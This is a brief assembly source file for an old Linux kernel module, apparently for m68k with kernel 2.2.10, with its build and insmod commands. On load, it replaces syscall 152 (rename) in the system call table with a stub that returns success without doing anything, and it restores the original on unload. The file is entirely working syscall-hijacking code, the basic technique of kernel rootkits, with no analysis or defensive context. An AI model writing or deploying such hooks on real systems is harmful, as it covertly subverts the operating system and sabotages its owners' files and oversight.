# as rename_hijack.s -o rename_hijack.o
# insmod rename_hijack.o

# 152 - rename 

.text
init_module:
 	movl sys_call_table+152,old_syscall
	movl #new_syscall,sys_call_table+152
        eorl %d0,%d0
	rts
cleanup_module:
	movl old_syscall,sys_call_table+152
	rts
new_syscall:
	eorl %d0,%d0
	rts
.data
old_syscall: .long 0

.section .modinfo
.string "kernel_version=2.2.10"
